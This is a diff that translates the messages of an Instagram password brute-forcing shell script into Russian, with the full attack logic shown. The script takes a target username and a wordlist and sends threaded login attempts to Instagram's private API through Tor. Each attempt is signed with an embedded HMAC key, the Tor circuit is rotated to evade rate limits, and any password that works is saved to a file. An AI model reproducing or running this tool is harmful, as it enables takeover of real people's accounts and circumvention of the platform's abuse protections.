@@ -16,27 +16,27 @@ var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
 
 checkroot() {
 if [[ "$(id -u)" -ne 0 ]]; then
-    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
+    printf "\e[1;77mЗапускайте скрипт от имени супер пользователя!\n\e[0m"
     exit 1
 fi
 }
 
 dependencies() {
 
-command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }
-command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."; exit 1; }
+command -v tor > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mtor\033[0m, но его нет, используй ./installreq.sh. Выход."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mcurl\033[0m, но его нет, используй ./installreq.sh. Выход."; exit 1; }
+command -v openssl > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mopenssl\033[0m, но его нет, используй ./installreq.sh. Выход."; exit 1; }
 
-command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }
-command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
-command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
-command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
-command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
-command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
-command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }
+command -v awk > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mawk\033[0m. Выход."; exit 1; }
+command -v sed > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30msed\033[0m. Выход."; exit 1; }
+command -v cat > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mcat\033[0m. Выход."; exit 1; }
+command -v tr > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mtr\033[0m. Выход."; exit 1; }
+command -v wc > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mwc\033[0m. Выход."; exit 1; }
+command -v cut > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30mcut\033[0m. Выход."; exit 1; }
+command -v uniq > /dev/null 2>&1 || { echo -en >&2 "Мне нужен \033[41m\033[30muniq\033[0m. Выход."; exit 1; }
 if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
-echo "/dev/urandom not found!"
-exit 1
+    echo -en "\033[41m\033[30m/dev/urandom\033[0m не найден!"
+    exit 1
 fi
 
 }
@@ -51,6 +51,7 @@ printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  __
 printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
 printf "\n"
 printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.2 Author: thelinuxchoice (Github/IG)   \e[0m\n"
+printf "\e[1;77m\e[45m            RU by XI_shArky_IX (github.com/XIshArkIX)   \e[0m\n"
 printf "\n"
 }
 
@@ -58,18 +59,18 @@ function start() {
 banner
 checkroot
 dependencies
-read -p $'\e[1;92mUsername account: \e[0m' user
-checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "the page may have been removed")
+read -p $'\e[1;92mИмя аккаунта: \e[0m' user
+checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "страница возможно удалена или не сущетсвует по каким-либо причинам")
 if [[ "$checkaccount" == 1 ]]; then
-printf "\e[1;91mInvalid Username! Try again\e[0m\n"
+printf "\e[1;91mНеправильное имя аккаунта, попробуй ещё раз.\e[0m\n"
 sleep 1
 start
 else
 default_wl_pass="passwords.lst"
-read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
+read -p $'\e[1;92mСловарь (или Enter для использования стандартного): \e[0m' wl_pass
 wl_pass="${wl_pass:-${default_wl_pass}}"
 default_threads="10"
-read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
+read -p $'\033[41m\033[30mНЕСТАБИЛЬНО!!! Особенно при использовании ключа --resume\033[0m\n\e[1;92mПотоки (Используйте <20 или Enter, чтобы использовать 10): \e[0m' threads
 threads="${threads:-${default_threads}}"
 fi
 }
@@ -79,7 +80,7 @@ checktor() {
 check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)
 
 if [[ "$check" -gt 0 ]]; then
-printf "\e[1;91mPlease, check your TOR Connection! Just type tor or service tor start\n\e[0m"
+printf "\e\033[0;33m[!][1;91m Пожалуйста, проверте соединение с TOR! Просто напишите \033[0;32mtor\033[0m или \033[0;32mservice tor start\n\e[0m\033[0m"
 exit 1
 fi
 
@@ -88,23 +89,23 @@ fi
 function store() {
 
 if [[ -n "$threads" ]]; then
-printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
+printf "\e[1;91m [*] Остановка всех потоков...\n\e[0m"
 if [[ "$threads" -gt 10 ]]; then
 sleep 6
 else
 sleep 3
 fi
 default_session="Y"
-printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $user
-read -p $'\e[1;77m? [Y/n]: \e[0m' session
+printf "\n\e[1;77mСохранить сессию для пользователя\e[0m\e[1;92m %s \e[0m" $user
+read -p $'\e[1;77m? [Д/н]: \e[0m' session
 session="${session:-${default_session}}"
-if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
+if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" || "$session" == "Да" || "$session" == "Д" || "$session" == "да" || "$session" == "д" ]]; then
 if [[ ! -d sessions ]]; then
 mkdir sessions
 fi
 printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $user $pass $wl_pass $token > sessions/store.session.$user.$(date +"%FT%H%M")
-printf "\e[1;77mSession saved.\e[0m\n"
-printf "\e[1;92mUse ./instashell --resume\n"
+printf "\e[1;77mСессия сохранена.\e[0m\n"
+printf "\e[1;92mИспользуйте ./instashell --resume\n"
 else
 exit 1
 fi
@@ -124,16 +125,16 @@ function bruteforcer() {
 
 checktor
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
-printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $user
-printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
-printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
+printf "\e[1;92mИмя пользователя:\e[0m\e[1;77m %s\e[0m\n" $user
+printf "\e[1;92mСловарь:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
+printf "\e[1;91m[*] Нажмите \033[41m\033[0;30mCtrl + C\033[0m, чтобы остановить или сохранить сессию\n\e[0m"
 token=0
 startline=1
 endline="$threads"
 while [ $token -lt $count_pass ]; do
 IFS=$'\n'
 for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
-header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "ru-RU", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"'
 
 data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
@@ -143,9 +144,9 @@ hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 let token++
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $pass
+printf "\e[1;77mПробую (%s/%s)\e[0m: %s\n" $token $count_pass $pass
 
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
+{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n [*] Запрошено испытание\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Найден пароль: %s\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
 
 let startline+=$threads
 let endline+=$threads
@@ -161,10 +162,10 @@ banner
 checktor
 counter=1
 if [[ ! -d sessions ]]; then
-printf "\e[1;91m[*] No sessions\n\e[0m"
+printf "\e[1;91m[*] Ни сохранено не одной сессии\n\e[0m"
 exit 1
 fi
-printf "\e[1;92mFiles sessions:\n\e[0m"
+printf "\e[1;92mФайлы сессий:\n\e[0m"
 for list in $(ls sessions/store.session*); do
 IFS=$'\n'
 source $list
@@ -177,9 +178,9 @@ default_threads=10
 read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
 threads="${threads:-${default_threads}}"
 
-printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
-printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
-printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
+printf "\e[1;92m[*] Продолжаю сессию для:\e[0m \e[1;77m%s\e[0m\n" $user
+printf "\e[1;92m[*] Словарь: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
+printf "\e[1;91m[*] Нажмите \033[41m\033[0;30mCtrl + C\033[0m, чтобы остановить или сохранить сессию\n\e[0m"
 
 
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
@@ -188,7 +189,7 @@ while [ $token -lt $count_pass ]; do
 IFS=$'\n'
 for pass in $(sed -n '/\b'$pass'\b/,'$(($token+threads))'p' $wl_pass); do
 
-header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "ru-RU", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"'
 
 data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
@@ -196,9 +197,9 @@ ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 countpass=$(grep -n -w "$pass" "$wl_pass" | cut -d ":" -f1)
 hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
 useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $pass
+printf "\e[1;77mПробую (%s/%s)\e[0m: %s\n" $token $count_pass $pass
 let token++
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
+{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; ru_RU)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "200\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Пароль найден: %s\n [*] Запрошено испытание\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "200" ]]; then printf "\e[1;92m \n [*] Пароль найден: %s\n" $pass; printf "Имя пользователя: %s, Пароль: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Сохранено:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
 
 changeip
 done
